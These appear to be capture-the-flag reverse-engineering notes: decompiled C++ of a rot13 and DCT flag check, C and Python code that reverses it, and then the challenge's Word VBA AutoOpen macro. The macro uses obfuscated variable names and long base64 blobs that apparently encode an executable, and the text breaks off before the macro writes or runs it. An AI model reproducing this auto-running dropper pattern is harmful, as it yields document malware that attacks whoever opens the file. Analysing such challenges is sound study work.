  int cd; // [esp+5Ch] [ebp-Ch]

  std::
allocator::
allocator(v4);
  v1 = (std::
vector *)strlen(flag);
  std::
vector::
vector(v1, (std::
vector::
size_type)__n, v13);
  std::
allocator::~allocator(v5);
  for ( i = 0; strlen(flag) > i; ++i )
  {
    v2 = flag[i];
    *std::
vector::
operator[]((std::
vector *const)i, v11) = v2;
  }
  encrypt((std::
vector<double> *)((char *)__n + 1), &input);// 将输入进行rot13，然后传入做离散余弦变换（DCT）
  std::
vector<double>::
operator=((std::
vector<double> *const)((char *)__n + 1), v12);
  std::
vector<double>::~vector(v6);
  cd = 0;
  __for_range = &encrypted;
  LODWORD(__for_begin._M_current) = (std::
vector<double>::
iterator)std::
vector<double>::
begin(v7)._M_current;
  LODWORD(__for_end._M_current) = (std::
vector<double>::
iterator)std::
vector<double>::
end(v8)._M_current;
  while ( __gnu_cxx::
operator!=<double *,std::
vector<double>>(&__for_begin, &__for_end) )
  {
    val = *__gnu_cxx::
__normal_iterator<double *,std::
vector<double>>::
operator*(v9);
    v3 = cd++;
    in[v3] = val;
    __gnu_cxx::
__normal_iterator<double *,std::
vector<double>>::
operator++(v10);
  }
  std::
vector::~vector((std::
vector *const)v9);
}
std::
vector<double> *__cdecl encrypt(std::
vector<double> *retstr, const std::
vector *input)
{
  long double v2; // fst7
  double *v3; // eax
  long double v4; // fst7
  double *eax9; // eax
  const std::
vector *_0; // [esp+0h] [ebp-68h]
  std::
allocator<double> *const v8; // [esp+0h] [ebp-68h]
  std::
allocator<double> *const v9; // [esp+0h] [ebp-68h]
  std::
vector::
size_type v10; // [esp+4h] [ebp-64h]
  std::
vector<double>::
size_type v11; // [esp+4h] [ebp-64h]
  std::
vector<double>::
size_type v12; // [esp+4h] [ebp-64h]
  const std::
vector<double>::
allocator_type *v13; // [esp+Ch] [ebp-5Ch]
  char __value; // [esp+2Fh] [ebp-39h] BYREF
  std::
vector<double>::
value_type __value_1; // [esp+30h] [ebp-38h] BYREF
  double v7; // [esp+38h] [ebp-30h]
  double v6; // [esp+40h] [ebp-28h]
  double v5; // [esp+48h] [ebp-20h]
  int size; // [esp+54h] [ebp-14h]
  int j; // [esp+58h] [ebp-10h]
  int i; // [esp+5Ch] [ebp-Ch]

  size = std::
vector::
size(_0);
  std::
allocator<double>::
allocator(v8);
  __value_1 = 0.0;
  std::
vector<double>::
vector(
    (std::
vector<double> *const)size,
    (std::
vector<double>::
size_type)&__value_1,
    (const std::
vector<double>::
value_type *)&__value,
    v13);
  std::
allocator<double>::~allocator(v9);
  for ( i = 0; i < size; ++i )
  {
    for ( j = 0; j < size; ++j )
    {
      v5 = (double)*std::
vector::
operator[]((const std::
vector *const)j, v10);
      v2 = cos(((long double)j + 0.5) * ((long double)i * 3.141592653589793) / (long double)size);
      v6 = v2 * v5;
      v3 = std::
vector<double>::
operator[]((std::
vector<double> *const)i, v11);
      *v3 = *v3 + v6;
    }
    if ( i )
      v4 = sqrt(2.0 / (long double)size);
    else
      v4 = sqrt(1.0 / (long double)size);
    v7 = v4;
    eax9 = std::
vector<double>::
operator[]((std::
vector<double> *const)i, v12);
    *eax9 = *eax9 * v7;
  }
  return retstr;
}
    #include <stdio.h>
    #include <math.h>
    #include <stdlib.h>

    #define PI 3.141592653589793

// 一维离散余弦变换（DCT）函数
void dct(double *output, const double *input, int size) {
    int i, j;
    for (i = 0; i < size; i++) {
        output[i] = 0.0;
        for (j = 0; j < size; j++) {
            output[i] += input[j] * cos(PI * (j + 0.5) * i / size);
        }
        if (i == 0) {
            output[i] *= sqrt(1.0 / size);
        } else {
            output[i] *= sqrt(2.0 / size);
        }
    }
}

// 一维逆离散余弦变换（IDCT）函数
void idct(double *output, const double *input, int size) {
    int i, j;
    for (i = 0; i < size; i++) {
        output[i] = input[0] / 2.0;
        for (j = 1; j < size; j++) {
            output[i] += input[j] * cos(PI * j * (i + 0.5) / size);
        }
        output[i] *= sqrt(2.0 / size);
    }
}

int main() {
    // 示例输入数据
    double input[] = {513.355, -37.7986, 8.7316, -10.7832, -1.3097, -20.5779, 6.98641, -29.2989, 15.9422, 21.4138, 29.4754, -2.77161, -6.58794, -4.22332, -7.20771, 8.83506, -4.38138, -19.3898, 18.3453, 6.88259, -14.7652, 14.6102, 24.7414, -11.6222, -9.754759999999999, 12.2424, 13.4343, -34.9307, -35.735, -20.0848, 39.689, 21.879, 26.8296};
// double input[] = {81.0, 78.0, 70.0, 80.0, 71.0, 83.0, 123.0, 49.0, 50.0, 51.0, 52.0, 53.0, 54.0, 55.0, 56.0, 57.0, 48.0, 110.0, 110.0, 110.0, 49.0, 50.0, 51.0, 52.0, 53.0, 54.0, 55.0, 56.0, 57.0, 48.0, 49.0, 50.0, 125.0};
    int size = sizeof(input) / sizeof(input[0]);
    
    // 用于存储DCT和IDCT结果的数组
    double *dct_output = (double *)malloc(size * sizeof(double));
    double *idct_output = (double *)malloc(size * sizeof(double));
    
    // 执行DCT变换
//    dct(dct_output, input, size);
//   double input[] = {81.0, 78.0, 70.0, 80.0, 71.0, 83.0, 123.0, 49.0, 50.0, 51.0, 52.0, 53.0, 54.0, 55.0, 56.0, 57.0, 48.0, 110.0, 110.0, 110.0, 49.0, 50.0, 51.0, 52.0, 53.0, 54.0, 55.0, 56.0, 57.0, 48.0, 49.0, 50.0, 125.0};
//    381.230067 22.765837 12.138521 20.418549 45.322176 -55.330773 -19.872444 4.041609 14.638820 -41.587539 46.214745 24.944484 12.617151 -26.547497 31.116147 -23.747905 -18.593380 -19.674314 21.982161 -5.873044 19.006854 10.397105 20.310096 -3.669930 -0.739206 -27.396160 -6.001943 -9.055204 -6.939081 -9.623374 26.139396 13.236018 -7.880097
    
    // 输出DCT结果
//    printf("DCT Result:n");
//    int i; 
//    for (i = 0; i < size; i++) {
//        printf("%f ", dct_output[i]);
//    }
//    printf("n");
    
    // 执行IDCT变换
    idct(idct_output, input, size);
    
    // 输出IDCT结果
    printf("IDCT Result:n");
    int j;
    for (j = 0; j < size; j++) {
        printf("%f ", idct_output[j]);
    }
    printf("n");
    
    // 释放分配的内存
    free(dct_output);
    free(idct_output);

    return 0;
}
flag = '54.825994 51.826012 43.826006 53.825992 44.825975 56.826027 96.825993 47.825943 90.826003 21.825981 68.825999 22.825983 75.826013 68.825986 63.825976 83.825960 22.825993 70.825993 68.826042 37.826022 70.826000 86.826046 68.825947 56.825984 77.825997 70.826023 70.826012 49.826017 68.826002 54.825998 85.825945 76.826027 98.825979'.split(' ')

for _ in range(255):
 temp = [int(i.split('.')[0])+_ for i in flag]

 print(f'每位加上{_} --> ', end="")
 for i in temp:
  print(chr(i), end="")
 print()
 print('*' * 100)
Sub AutoOpen()
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set objShell = CreateObject("WScript.Shell")

 isContinue = 7
 temp = MsgBox("I?am???Vcke?!!!_I???m??Hac?er??!!???_am_Hac?er!!!_I_a?_????ok?r!!!", vbCritical, "Hacked_by_??????")
 Do
 inflag = InputBox("Give me your flag", "Hacked_by_??????")
 If inflag = "" Then
 inflag = "noflag"
 End If
 Result = ""
 For i = 1 To Len(inflag)
 res = Chr(Asc(Mid(inflag, i, 1)) Xor 7)

 Result = Result & res
 Next i

 FOwoRiFKKMMDhtxiUfJDWzaqNJrPZwASlDxnERT = "TXpNek16TXpNek16TXpFaUQ3Q2pva2VyLy8waUR4Q2pEek16TXpNek16TXpNek16TXpNek16TXpNU0lQc1NPaW82di8vU0lsRUpDam8rK3ovLzBpTEFFaUpSQ1F3Nkx6cy8vK0xBSWxFSkNCTWkwUWtLRWlMVkNRd2kwd2tJT2hPN1AvL1NJUEVTTVBNek16TXpNek16TXpNek16TXpNek16TXhJZyt3b3VRRUFBQURvayt2Ly8waUR4Q2pEek16TXpNek16TXpNek16TXpFaUQ3RGpvS092Ly80bEVKQ0RvUyt6Ly80dE1KQ0NKQ0VpRHhEakR6TXpNek16TXpNek16TXpNek16TXpNek16RWlEN0Nqb1Rldi8vNHZJNkhYcC8vOUlnOFFvdzh6TXpNek16TXpNek16TVNJbE1KQWhJZyt3bzZNTDgvLzlJZzhRb3c4ek16TXpNek16TXpNek16TXhJZyt4WWlVd2tLRWlOUkNSZ1NJMU1KQ0JJaVVRa01NWkVKR0FBeDBRa0lBRVFBQURvdHdjQUFJQjhKR0FBRDVYQVNJUEVXTVBNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16RWlEN0ZpSlRDUW9TSTFFSkdCSWpVd2tJRWlKUkNRNHhrUWtZQURIUkNRZ0FoQUFBSWxVSkN4TWlVUWtNRXlKVENSQTZGa0hBQUNBZkNSZ0FBK1Z3RWlEeEZqRHpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpFQlZWbGRCVmtpQjdQZ0JBQUJJaXdXRXFBQUFTRFBFU0ltRUpPQUJBQUNMUFpPb0FBQkZpL0JJaS9KSWkrbUQvLzhQaEFFQkFBQkloZEoxRjBTTlFn"
 KJApECBsBygCpaCPqkHESDxewQKrYbmg = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 fqbGMOBQtLlIfRylAswLJzJIwewRSFLOCJBsqNXcSjiABtKPFWgGJgnkVLQSEDniZulS = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFGQWlBVUFCQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 AICsXopyxjKVOYHULreIvTjeZLWJSnHXVjXvGUXXHLubqYrPXyEhrHZsdtCGeYhs = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 cEHQlEzbinraPdDZxiXfvwhswqBcsFPVVJnCcMMMaKf = "ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16"
 znGAYdzaLHTCbsrUAAiOWfIWelxJaiawlEYPZH = "SXRNSkREb3VRQUFBSVhBZEJWSWkwd2tNT2pyL3YvL2hjQjBCN2xCQUFBQXpTbElnOFFvdzh6TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNekV5SlJDUVlTSWxVSkJCSWlVd2tDTVBNek16TXpNek16TXpNek16TXpNek1USWxFSkJoSWlWUWtFRWlKVENRSVNJUHNLRXlMUkNSQVNJdFVKRGhJaTB3a01PZzVBQUFBaGNCMEdFaUxUQ1F3Nkd2Ky8vK0Z3SFFLU0l0TUpERG9IZjcvLzBpRHhDakR6TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TVRJbEVKQmhJaVZRa0VFaUpUQ1FJU0lQc0tFaU5CVlp3QUFCSUJZQUFBQUJJaVVRa0NFaUxSQ1E0U0l0TUpBaElBOGhJaThGSWlVUWtFRWlMUkNRUVNJdE1KREJJSzhoSWk4RklPMFFrUUhZSnh3UWtBUUFBQU9zSHh3UWtBQUFBQUlzRUpFaUR4Q2pEek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TVNJUHNPRWlORFZYbEFBRG9yc2IvLzBpTkRZREYvLzlJTzhGMENzZEVKQ0FCQUFBQTZ3akhSQ1FnQUFBQUFJdEVKQ0JJZzhRNHc4ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek13endNUE16TXpNek16TXpNek16TXpNU0lIc1dBUUFBRWlMQmZxRUFBQklNOFJJaVlRa1FBUUFBSUE5a1kwQUFBQVBoUndCQUFER0JZU05BQUFCNkk0QkFBQkloY0FQaFFrQkFBQklqUTBtYWdBQTZLbkYvLzlJ"
 CxNzoOzrcwNLxwYcHMjlpynrYs = "TXpNek1kUkZJWTBRNkJFZ0R3WUU4S016TXpNeDBEMGlMVENRb1NJdFVPZ2pvWnZULy8vL0RTSVBIRURzZWZNUklpM3drTUVpTFhDUTRTSXRzSkVCSWc4UWdYc1BNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNekVCVFYwaUQ3Q2hJaVd3a1FEUC9USWw4SkNCSmk5aElpK3BNaS9sSWhkSjBYRWlKZENSSWkvYzVPbjVNVElsMEpGQkVpL2RJaTFVSVNtTU1Na0tCZkRuOHpNek16SFVTU21ORU1nUklBOEZDZ1R3NHpNek16SFFQU0l0TUpEaEtpMVF5Q09pdzgvLy8vOFpKZzhZUU8zVUFmTUZNaTNRa1VFaUxkQ1JJVEl0OEpDQklpOE5JaTJ3a1FFaUYyM1J0a0VpTFFBVC94MGlGd0hYMUR4OUVBQUNCTzh6TXpNeDFHNEY3Rk16TXpNeDFFb0Y3R016TXpNeDFDWUY3SE16TXpNeDBFRWlMVENRNFJJdkhTSXZUNkVuMC8vOUlpME1NZ1h3WS9Nek16TXgwRUVpTFRDUTRSSXZIU0l2VDZDdjAvLzlJaTFzRS84OUloZHQxcEVpRHhDaGZXOFBNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpFaU5CWXJ5Ly8vRHpNek16TXpNek14SWpRWFI4UC8vdzh6TXpNek16TXpNU0lQc09JQTl2ckVBQUFCMUxVRzVBUUFBQU1ZRnI3"
 tLnjIIqQbfzUXdfNouipqHjXpLG = "TXpNek14SWcrd282TEhZLy8vb3h0Zi8vN0FCU0lQRUtNUE16TXpNek16TXpNek16RXlKVENRZ1RJbEVKQmlKVkNRUVNJbE1KQWhJZyt3NDZIL1gvLytGd0hVeWczd2tTQUYxSzBpTFJDUllTSWxFSkNCSWkwUWtJRWlKUkNRb1RJdEVKRkF6MGtpTFRDUkFTSXRFSkNqL0ZTNzJBQUJJaTFRa2FJdE1KR0Rvek5mLy8waUR4RGpEek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNU0lQc0tPZ1MxLy8vaGNCMERraU5EUXllQUFEb0J0ai8vK3NPNkVmVy8vK0Z3SFVGNkFuWi8vOUlnOFFvdzh6TXpNek16TXpNek16TXpNek16TXpNekVpRDdDZ3p5ZWdNMS8vLzZBYlkvLzlJZzhRb3c4ek16TXpNek16TXpNek1pVXdrQ0VpRDdDaURmQ1F3QUhVSHhnV2luUUFBQWVobjJQLy82T0xWLy84UHRzQ0Z3SFVFTXNEckdlZ1cyUC8vRDdiQWhjQjFDelBKNlBiVi8vOHl3T3NDc0FGSWc4UW93OHpNek16TXpNek16TXpNek16TXpNek16TXpNek16TWlVd2tDRlpYU0lQc2FBKzJCVWlkQUFDRndIUUhzQUhwNFFBQUFJTzhKSUFBQUFBQWRCU0R2Q1NBQUFBQUFYUUt1UVVBQUFEbzdkZi8vK2djMXYvL2hjQjBPb084SklBQUFBQUFkVEJJalEwTW5RQUE2R25ZLy8rRndIUUhNc0RwbVFBQUFFaU5EUTJkQUFEb1V0ai8vNFhBZEFjeXdPbUNBQUFBNjNkSXgwUWtJUC8vLy85SWkwUWtJRWlKUkNRb1NJdEVKQ0JJ"
 YABsnhnhxXaUhoDPUSvvFRbIsOHAc = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 SAJdC = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 TZHYOwXfxjTPvguvOFnAT = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFQRDk0Yld3Z2RtVnljMmx2Ymowbk1TNHdKeUJsYm1OdlpHbHVaejBuVlZSR0xUZ25JSE4wWVc1a1lXeHZibVU5SjNsbGN5Yy9QZzBLUEdGemMyVnRZbXg1SUhodGJHNXpQU2QxY200NmMyTm9aVzFoY3kxdGFXTnliM052Wm5RdFkyOXRPbUZ6YlM1Mk1TY2diV0Z1YVdabGMzUldaWEp6YVc5dVBTY3hMakFuUGcwS0lDQThkSEoxYzNSSmJtWnZJSGh0Ykc1elBTSjFjbTQ2YzJOb1pXMWhjeTF0YVdOeWIzTnZablF0WTI5dE9tRnpiUzUyTXlJK0RRb2dJQ0FnUEhObFkzVnlhWFI1UGcwS0lDQWdJQ0FnUEhKbGNYVmxjM1JsWkZCeWFYWnBiR1ZuWlhNK0RRb2dJQ0FnSUNBZ0lEeHlaWEYxWlhOMFpXUkZlR1ZqZFhScGIyNU1aWFpsYkNCc1pYWmxiRDBuWVhOSmJuWnZhMlZ5SnlCMWFVRmpZMlZ6Y3owblptRnNjMlVuSUM4K0RRb2dJQ0FnSUNBOEwzSmxjWFZsYzNSbFpGQnlhWFpwYkdWblpYTStEUW9nSUNBZ1BDOXpaV04xY21sMGVUNE5DaUFnUEM5MGNuVnpkRWx1Wm04K0RRbzhMMkZ6YzJWdFlteDVQZzBLQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 KuoAmNWXhbIXyUUDtQJrlEs = "TXpNek16TXpNU0lQc0tFaU5EWURMLy8vL0ZWZkxBQUJJZzhRb3c4ek16TXpNek16TXpNd3p3TVBNek16TXpNek16TXpNek16TVNJbE1KQWhJZyt3NFNJdEVKRUJJaXdCSWlVUWtJRWlMUkNRZ2dUaGpjMjNnZFhCSWkwUWtJSU40R0FSMVpVaUxSQ1FnZ1hnZ0lBV1RHWFFxU0l0RUpDQ0JlQ0FoQlpNWmRCeElpMFFrSUlGNElDSUZreGwwRGtpTFJDUWdnWGdnQUVDWkFYVXQ2SnZLLy85SWkwd2tJRWlKQ0VpTFJDUkFTSXRBQ0VpSlJDUW82QnJNLy85SWkwd2tLRWlKQ09nS3l2Ly9NOEJJZzhRNHc4ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek1TSWxjSkFoWFNJUHNJRWlOSFVkNUFBQklqVDFZZXdBQVNEdmZjeG9QSHdCSWl3TkloY0IwQnY4Vm91a0FBRWlEd3doSU85OXk2VWlMWENRd1NJUEVJRi9Eek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TVNJbGNKQWhYU0lQc0lFaU5IUmQ4QUFCSWpUMG9mZ0FBU0R2ZmN4b1BId0JJaXdOSWhjQjBCdjhWUXVrQUFFaUR3d2hJTzk5eTZVaUxYQ1F3U0lQRUlGL0R6TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNU0lsTUpBakR6TXpNek16TXpNek16RWlKVENRSVNJUHNHRWlMUkNRZ1NJc0FTSWtFSkVpTEJDUklnOFFZdzh6TXpNek16TXpNek16TXpNek16TXpNekVpSlRD"
 rGDzbNeSOAQBdDQMhR = "R2x1WnlCaElHWjFibU4wYVc5dUlHUmxZMnhoY21Wa0lIZHBkR2dnYjI1bElHTmhiR3hwYm1jZ1kyOXVkbVZ1ZEdsdmJpQjNhWFJvSUdFZ1puVnVZM1JwYjI0Z2NHOXBiblJsY2lCa1pXTnNZWEpsWkNCM2FYUm9JR0VnWkdsbVptVnlaVzUwSUdOaGJHeHBibWNnWTI5dWRtVnVkR2x2Ymk0TkNnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCQklHTmhjM1FnZEc4Z1lTQnpiV0ZzYkdWeUlHUmhkR0VnZEhsd1pTQm9ZWE1nWTJGMWMyVmtJR0VnYkc5emN5QnZaaUJrWVhSaExpQWdTV1lnZEdocGN5QjNZWE1nYVc1MFpXNTBhVzl1WVd3c0lIbHZkU0J6YUc5MWJHUWdiV0Z6YXlCMGFHVWdjMjkxY21ObElHOW1JSFJvWlNCallYTjBJSGRwZEdnZ2RHaGxJR0Z3Y0hKdmNISnBZWFJsSUdKcGRHMWhjMnN1SUNCR2IzSWdaWGhoYlhCc1pUb2dJQTBLQ1dOb1lYSWdZeUE5SUNocElDWWdNSGhHUmlrN0RRcERhR0Z1WjJsdV